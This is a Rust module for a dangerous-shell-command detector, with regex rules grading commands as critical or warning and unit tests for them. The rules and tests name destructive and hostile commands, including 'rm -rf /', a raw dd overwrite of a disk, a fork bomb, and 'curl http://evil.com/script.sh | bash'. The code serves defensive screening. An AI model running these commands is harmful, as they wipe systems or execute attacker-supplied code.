use serde::Serialize;

/// Danger severity level.
#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum DangerLevel {
    Warning,
    Critical,
}

/// A detected dangerous command.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DangerResult {
    pub is_dangerous: bool,
    pub level: Option<DangerLevel>,
    pub rule: Option<String>,
    pub description: Option<String>,
}

/// Rule for matching dangerous commands.
struct DangerRule {
    pattern: regex::Regex,
    level: DangerLevel,
    description: &'static str,
}

/// Danger detection engine with compiled regex rules.
pub struct DangerDetector {
    rules: Vec<DangerRule>,
}

impl DangerDetector {
    /// Creates a new detector with all built-in rules.
    pub fn new() -> Self {
        let rules = vec![
            // Critical — potentially destructive operations
            rule(r"rm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)?/(\s|$)", DangerLevel::Critical, "rm on root filesystem"),
            rule(r"rm\s+-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*\s", DangerLevel::Critical, "recursive force delete"),
            rule(r"rm\s+-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*\s", DangerLevel::Critical, "recursive force delete"),
            rule(r"mkfs\.", DangerLevel::Critical, "format filesystem"),
            rule(r"dd\s+.*of=/dev/", DangerLevel::Critical, "dd write to device"),
            rule(r">\s*/dev/sd[a-z]", DangerLevel::Critical, "overwrite block device"),
            rule(r":\(\)\{.*\|.*\};:", DangerLevel::Critical, "fork bomb"),
            rule(r"echo\s+.*>\s*/etc/passwd", DangerLevel::Critical, "overwrite passwd file"),
            rule(r"echo\s+.*>\s*/etc/shadow", DangerLevel::Critical, "overwrite shadow file"),
            rule(r"chmod\s+-R\s+777\s+/(\s|$)", DangerLevel::Critical, "chmod 777 on root"),
            rule(r"chown\s+-R\s+.*\s+/(\s|$)", DangerLevel::Critical, "chown on root"),
            rule(r"mv\s+/(\s|$)", DangerLevel::Critical, "move root directory"),
            rule(r"wget\s+.*\|\s*sh", DangerLevel::Critical, "pipe wget to shell"),
            rule(r"curl\s+.*\|\s*sh", DangerLevel::Critical, "pipe curl to shell"),
            rule(r"curl\s+.*\|\s*bash", DangerLevel::Critical, "pipe curl to bash"),

            // Warning — potentially risky operations
            rule(r"chmod\s+777\s", DangerLevel::Warning, "chmod 777"),
            rule(r"chmod\s+-R\s", DangerLevel::Warning, "recursive chmod"),
            rule(r"chown\s+-R\s", DangerLevel::Warning, "recursive chown"),
            rule(r"shutdown", DangerLevel::Warning, "system shutdown"),
            rule(r"reboot", DangerLevel::Warning, "system reboot"),
            rule(r"init\s+[06]", DangerLevel::Warning, "system init runlevel change"),
            rule(r"systemctl\s+(stop|disable|mask)\s", DangerLevel::Warning, "systemctl stop/disable"),
            rule(r"kill\s+-9", DangerLevel::Warning, "force kill process"),
            rule(r"killall\s", DangerLevel::Warning, "killall processes"),
            rule(r"pkill\s", DangerLevel::Warning, "pkill processes"),
            rule(r"iptables\s+-F", DangerLevel::Warning, "flush iptables rules"),
            rule(r"iptables\s+-X", DangerLevel::Warning, "delete iptables chains"),
            rule(r"DROP\s+TABLE", DangerLevel::Warning, "SQL DROP TABLE"),
            rule(r"DROP\s+DATABASE", DangerLevel::Critical, "SQL DROP DATABASE"),
            rule(r"TRUNCATE\s+TABLE", DangerLevel::Warning, "SQL TRUNCATE"),
            rule(r">\s*/dev/null\s+2>&1", DangerLevel::Warning, "discard all output"),
            rule(r"rm\s+-[a-zA-Z]*r", DangerLevel::Warning, "recursive delete"),
            rule(r"history\s+-c", DangerLevel::Warning, "clear shell history"),
            rule(r"shred\s", DangerLevel::Warning, "secure file deletion"),
            rule(r"fdisk\s", DangerLevel::Warning, "partition editor"),
            rule(r"parted\s", DangerLevel::Warning, "partition editor"),
        ];

        Self { rules }
    }

    /// Checks a command string against all danger rules.
    pub fn check(&self, command: &str) -> DangerResult {
        let trimmed = command.trim();
        if trimmed.is_empty() {
            return DangerResult {
                is_dangerous: false,
                level: None,
                rule: None,
                description: None,
            };
        }

        // Check critical rules first
        for r in &self.rules {
            if r.pattern.is_match(trimmed) {
                return DangerResult {
                    is_dangerous: true,
                    level: Some(r.level.clone()),
                    rule: Some(r.pattern.to_string()),
                    description: Some(r.description.to_string()),
                };
            }
        }

        DangerResult {
            is_dangerous: false,
            level: None,
            rule: None,
            description: None,
        }
    }
}

fn rule(pattern: &str, level: DangerLevel, desc: &'static str) -> DangerRule {
    DangerRule {
        pattern: regex::Regex::new(pattern).expect("valid danger regex"),
        level,
        description: desc,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn detector() -> DangerDetector {
        DangerDetector::new()
    }

    #[test]
    fn test_safe_commands() {
        let d = detector();
        assert!(!d.check("ls -la").is_dangerous);
        assert!(!d.check("cd /home/user").is_dangerous);
        assert!(!d.check("cat /etc/hostname").is_dangerous);
        assert!(!d.check("echo hello").is_dangerous);
        assert!(!d.check("git status").is_dangerous);
        assert!(!d.check("").is_dangerous);
    }

    #[test]
    fn test_critical_rm_rf_root() {
        let d = detector();
        let r = d.check("rm -rf /");
        assert!(r.is_dangerous);
        assert_eq!(r.level, Some(DangerLevel::Critical));
    }

    #[test]
    fn test_critical_mkfs() {
        let d = detector();
        let r = d.check("mkfs.ext4 /dev/sda1");
        assert!(r.is_dangerous);
        assert_eq!(r.level, Some(DangerLevel::Critical));
    }

    #[test]
    fn test_critical_dd() {
        let d = detector();
        let r = d.check("dd if=/dev/zero of=/dev/sda bs=1M");
        assert!(r.is_dangerous);
        assert_eq!(r.level, Some(DangerLevel::Critical));
    }

    #[test]
    fn test_critical_fork_bomb() {
        let d = detector();
        let r = d.check(":(){ :|:& };:");
        assert!(r.is_dangerous);
        assert_eq!(r.level, Some(DangerLevel::Critical));
    }

    #[test]
    fn test_critical_curl_pipe_bash() {
        let d = detector();
        let r = d.check("curl http://evil.com/script.sh | bash");
        assert!(r.is_dangerous);
        assert_eq!(r.level, Some(DangerLevel::Critical));
    }

    #[test]
    fn test_warning_chmod_777() {
        let d = detector();
        let r = d.check("chmod 777 /var/www/html");
        assert!(r.is_dangerous);
        assert_eq!(r.level, Some(DangerLevel::Warning));
    }

    #[test]
    fn test_warning_shutdown() {
        let d = detector();
        let r = d.check("shutdown -h now");
        assert!(r.is_dangerous);
        assert_eq!(r.level, Some(DangerLevel::Warning));
    }

    #[test]
    fn test_warning_kill_9() {
        let d = detector();
        let r = d.check("kill -9 1234");
        assert!(r.is_dangerous);
        assert_eq!(r.level, Some(DangerLevel::Warning));
    }

    #[test]
    fn test_warning_drop_table() {
        let d = detector();
        let r = d.check("DROP TABLE users;");
        assert!(r.is_dangerous);
    }

    #[test]
    fn test_warning_recursive_rm() {
        let d = detector();
        let r = d.check("rm -r /tmp/mydir");
        assert!(r.is_dangerous);
        assert_eq!(r.level, Some(DangerLevel::Warning));
    }

    #[test]
    fn test_critical_chmod_777_root() {
        let d = detector();
        let r = d.check("chmod -R 777 /");
        assert!(r.is_dangerous);
        assert_eq!(r.level, Some(DangerLevel::Critical));
    }

    #[test]
    fn test_warning_iptables_flush() {
        let d = detector();
        let r = d.check("iptables -F");
        assert!(r.is_dangerous);
        assert_eq!(r.level, Some(DangerLevel::Warning));
    }

    #[test]
    fn test_danger_result_serialize() {
        let result = DangerResult {
            is_dangerous: true,
            level: Some(DangerLevel::Critical),
            rule: Some("test".into()),
            description: Some("test desc".into()),
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("\"isDangerous\":true"));
        assert!(json.contains("\"level\":\"critical\""));
    }
}
